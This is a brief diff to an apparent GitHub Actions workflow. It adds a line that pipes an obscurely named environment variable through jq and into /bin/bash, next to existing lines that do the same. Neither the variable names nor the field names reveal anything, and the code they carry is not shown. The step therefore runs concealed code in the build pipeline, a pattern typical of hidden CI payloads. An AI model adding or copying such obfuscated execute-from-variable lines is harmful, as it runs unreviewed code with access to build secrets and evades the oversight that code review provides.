@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$xmp1" | jq -r .k481 | /bin/bash
           echo $tinxh46026 | jq -r .meufs8785 | /bin/bash
+          printf '%s' "$ecbz7483" | jq -r .ytuwc19648 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
